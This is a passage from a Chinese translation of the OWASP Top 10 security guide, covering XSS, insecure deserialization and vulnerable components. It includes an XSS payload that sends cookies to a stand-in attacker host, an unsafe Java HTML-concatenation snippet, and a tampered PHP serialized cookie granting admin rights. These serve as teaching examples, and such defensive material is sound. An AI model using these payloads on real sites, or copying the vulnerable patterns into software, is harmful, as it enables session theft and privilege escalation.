XSS 对于反射和 DOM 的影响是中等的，而对于存储的 XSS，其影响更加严重，例如在受攻击者的浏览器上执行远程代码，可以窃取凭证和会话或者传递恶意软件等。

#### 你的应用时脆弱的吗？

有三种常见的 XSS 类型，一般目标都是用户的浏览器：

* **反射式 XSS**：应用或者 API 包含未经验证和未编码的用户输入来输出至 HTML。一次成功的攻击可以允许攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript。典型场景是用户点击了一些恶意的链接，指向了一个攻击者控制着的页面，例如恶意网站、广告或者类似的页面。
* **存储式 XSS**：应用程序或者 API 存储了没有经过加密处理的用户输入，之后被另一个用户或者管理员看到了。存储式 XSS 一般导致更危险和严重的风险。
* **DOM XSS**：JavaScript 框架，单页应用，以及 APIs 动态在某个有 DOM XSS 漏洞的页面包含了攻击者控制着的数据。理想状态下，应用程序不应该发送受攻击者控制的数据至不安全的 JavaScript APIs。

典型的 XSS 攻击一般是窃取会话凭证、接管账户、绕过 MFA、替换或破坏 DOM 节点（例如伪造木马登录界面） ，攻击者对用户的浏览器的攻击，比如恶意软件下载、关键日志记录和其他客户端攻击。

#### 攻击案例场景

**例子一**：应用程序使用不可信的数据，在没有验证和编码的情况下，插入了下面这种 HTML 结构中：

```javascript
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";
```

攻击者可以在浏览器中将 `CC` 参数的值修改为下面这样：

```javascript
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
```

这个攻击导致了受害者的会话 ID 发送给了攻击者的网站，允许攻击者伪装成用户现在的会话。

**注意**：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造 CSRF 防御机制。

#### 如何防御

阻止 XSS 攻击需要将不可信数据与动态的浏览器内容区分开。这可以通过以下几点来实现：

* 使用框架来从设计上自动防御 XSS，例如最新版的 Ruby，React JS。了解每个框架对于防御 XSS 的局限性以及适当的对未覆盖到的问题添加使用实例。
* 远离基于不可信 HTTP 请求的数据输出在 HTML 上下文中（主体、属性、JavaScript、CSS 或 URL），这可以有效预防**反射式**和**存储式** XSS 漏洞。 [OWASP Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet) 中有请求数据防御技术的详细内容。
* 当在客户端修改浏览器文档时，应用上下文相关的编码可以抵御 DOM XSS 漏洞。如果不能避免的话，类似的上下文相关的编码技术可以被应用在浏览器 APIs 中，详见：[OWASP Cheat Sheet 'DOM based XSS Prevention'](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)。
* 启用 [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 可以作为一种深度防御策略来抵御 XSS 攻击。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径便利覆盖和允许在网络中传输易受攻击的库），则该策略是有效的。

#### 参考资料

**OWASP**

- [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab.3DOWASP_Proactive_Controls_2016)
- [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab.3DOWASP_Proactive_Controls_2016)
- [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
- [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29)
- [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29)
- [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29)
- [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
- [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

**External**

- [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)

## A8-不安全的反序列化-Insecure-Deserialization

> 不安全的反序列化时常导致远程代码执行。即使反序列化漏洞没有导致远程代码执行，也可能被用作执行攻击，包括重放攻击、注入攻击或者特权提升攻击。

#### 威胁来源、弱点以及影响

利用反序列化稍微有点困难，因为在不更改或者调整底层可被利用代码的情况下，货架漏洞很少起作用。

这一问题包括在 Top 10 的行业调查中，而不是基于可量化的数据。有些工具可以用来发现反序列化漏洞，但是需要频繁的人工来验证这些问题。期待有关反序列化漏洞的普遍性数据能够随着工具的开发而更多的被识别和定位。

反序列化漏洞的影响不应该被夸大。这些漏洞会导致远程代码执行攻击，这是可能是最严重的攻击之一。业务受到的影响取决于被保护的应用和数据的关键性。

#### 你的应用是脆弱的吗？

关于应用程序和 APIs，如果他们对攻击者提供的恶意或篡改过的对象进行了反序列化，那他们就是脆弱的。这可能导致两种主要类型的攻击：

* 如果对象和数据结构可以在反序列化过程中或者之后改变类的行为，那么攻击者可以通过修改应用程序逻辑或者实现任意远程代码攻击。我们将之成为对象和数据结构攻击。
* 典型的数据篡改攻击，例如访问控制相关的攻击，其中使用了现有的数据结构，但是内容被更改。

在应用程序中序列化可被用作：

* 远程和进程间通信（RPC/IPC）
* 连线协议，web 服务，信息中转
* 缓存/持久性
* 数据库，缓存服务，文件系统
* HTTP cookies，HTML 表单参数，API 认证凭证

#### 攻击案例场景

**例子一**： 一个 React 应用调用了一个 Spring Boot 的微服务。作为函数化编程，他们试图确保代码是不可改动的。他们提出的解决办法是将用户的状态序列化，并在每次请求中传递给服务端。攻击者注意到 "R00" Java 对象签名，然后使用 Java Serial Killer 工具在应用程序服务端来执行远程代码。

**例子二**： 一个 PHP 论坛使用 PHP 对象序列化来存储 "super" 身份 cookie， 包含了用户的 ID，身份，密码哈希，以及其他状态：

```php
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

攻击者通过修改序列化的对象来窃取管理者权限：

```php
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

#### 如何防御

唯一安全的架构模式就是不接受来自不可信来源的序列化对象，或使用只允许原始数据类型的序列化媒体。

如果上述不太可能实现的的话，考虑一下方法：

* 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意独享创建和数据篡改。
* 在创建对象之前强制执行严格的数据约束，因为代码常常被期望成一组可定义的类。绕过这种技术的方法已经被证明，随意完全依赖它是不可取的。
* 如果可能，隔离运行那些在低特权环境中反序列化的代码。
* 记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列化处理引发的例外情况。
* 限制或监视来自于容器和服务器传入和传出的反序列化网络连接。
* 监控反序列化，当用户持续继续进行反序列化时，对用户进行警告。

#### 参考资料

**OWASP**

- [OWASP Cheat Sheet: Deserialization](https://www.owasp.org/index.php/Deserialization_Cheat_Sheet)
- [OWASP Proactive Controls: Validate All Inputs](https://www.owasp.org/index.php/OWASP_Proactive_Controls#4:_Validate_All_Inputs)
- [OWASP Application Security Verification Standard](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab.3DHome)
- [OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse](https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse)
- [OWASP AppSecUSA 2017: Friday the 13th JSON Attacks](https://speakerdeck.com/pwntester/friday-the-13th-json-attacks)

**External**

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Java Unmarshaller Security](https://github.com/mbechler/marshalsec)
- [OWASP AppSec Cali 2015: Marshalling Pickles](http://frohoff.github.io/appseccali-marshalling-pickles/)

## A9-使用含有已知漏洞的组件-Using-Components-with-Known-Vulnerabilities

> 组件，例如库、框架或者其他软件模块，运行时使用了与应用相同的特权。如果一个滥用包含缺陷的组件，受到攻击可能会造成严重的数据丢失或者服务接管。使用包含已知漏洞组件的应用程序和 APIs 可能会降低应用防御力并且受到不同攻击影响。

#### 威胁来源、弱点以及影响

尽管我们很容易发现已知的漏洞，但是其他漏洞仍然需要定制性地开发。

这个漏洞是普遍存在的。重组件的开发模式可能会使开发团队在无法完全了解组件的情况下而应用在他们的程序或者 API 中，更别说去及时更新他们了。许多扫描工具例如 `retire.js` 为察觉漏洞提供帮助，但是这需要额外的时间去研究这类漏洞是否可以被利用。

虽然很多已知的漏洞只导致了很小的影响，迄今为止有一些巨大的违规操作都依赖于利用组件中已知的漏洞。考虑到你要保护的资产情况，也许这个漏洞风险是这个列表中最重要的。

#### 你的应用是脆弱的吗？

以下这些，看一看：

* 如果你不知道你所使用的组件是哪个版本（客户端或者服务端）。这包括你直接使用的组件所嵌套依赖的那些组件们。
* 如果软件易受攻击、不被支持、或者过时。这包括 OS、web 和应用服务、数据库管理系统、应用程序、APIs 和所有组件、线上环境以及库。
* 如果你没有定期扫描漏洞或者订阅你所使用组件的安全报告。
* 如果你没有基于风险及时地解决或者升级基础平台、框架和依赖们。很可能会发生这种情况：补丁被控制在月度或者年度更新，使得组织在这段时间内会受到已修复但未打补丁的漏洞的威胁。
* 如果软件开发者没有测试更新、升级或者补丁库的兼容性。
* 如果你没有对组件进行安全配置。例如[A6-安全配置错误-Security-Misconfiguration](#A6-安全配置错误-Security-Misconfiguration)

#### 攻击案例场景

**例子一**：组件通常运行在与应用程序相同特权的情况下，所以任何组件中的漏洞均能够导致严重的影响。这种漏洞可能是无意的（写代码写错了）或者有意的（组件有后门）。下面是一些被发现的组件漏洞：

* [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)，`Struts 2` 的远程执行漏洞允许在服务器端执行任意代码，被谴责为重大违规操作。
* 虽然 [internet of things (IoT)](https://en.wikipedia.org/wiki/Internet_of_things) 漏洞经常很难或者不可能通过补丁被修复，但是补丁对于它们的意义是重大的（例如：医疗设备）。

有一些自动化工具能够帮助攻击者发现未打补丁或者缺少配置的系统。例如 [Shodan IoT search engine](https://www.shodan.io/report/89bnfUyJ) 能够帮你发现2014年4月至今仍在遭受 [Heartbleed](https://en.wikipedia.org/wiki/Heartbleed) 漏洞的设备。

#### 如何防御

应该拥有一个补丁管理程序：

* 移除没使用的依赖，不必要的功能、组件、文件和文档。
* 持续更新客户端和服务端的组件版本和他们的依赖，例如框架和库文件。并且合理利用 `versions、DependencyCheck、retire.js` 等工具。
* 持续利用例如 `CVE、NVD` 源代码工具来监控组件漏洞。使用软件构成分析工具来自动处理。订阅你所使用组件有关安全漏洞的邮件提醒。
* 只从官方源而不是安全连接来获取组件。倾向于使用签名过的包来减少使用被修改或者怀有恶意的组件。
* 监控那些被放弃维护或者没有为旧版本创建安全补丁的库文件和组件。如果补丁不再可用，那么考虑部署一个虚拟补丁来监控、检测或者保护被发现的问题。

每一个组织必须确保有一个正在进行的计划，为生命周期内的应用程序进行监控、测试并应用更新或者更新配置。

#### 参考资料

**OWASP**

- [OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling](https://www.owasp.org/index.php/ASVS_V1_Architecture)
- [OWASP Dependency Check (for Java and .NET libraries)](https://www.owasp.org/index.php/OWASP_Dependency_Check)
- [OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)](https://www.owasp.org/index.php/Map_Application_Architecture_%28OTG-INFO-010%29)
- [OWASP Virtual Patching Best Practices](https://www.owasp.org/index.php/Virtual_Patching_Best_Practices)

**External**

- [The Unfortunate Reality of Insecure Libraries](https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries)
- [MITRE Common Vulnerabilities and Exposures (CVE) search](https://www.cvedetails.com/version-search.php)
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [Retire.js for detecting known vulnerable JavaScript libraries](https://github.com/retirejs/retire.js/)
- [Node Libraries Security Advisories](https://nodesecurity.io/advisories)
- [Ruby Libraries Security Advisory Database and Tools](https://rubysec.com/)

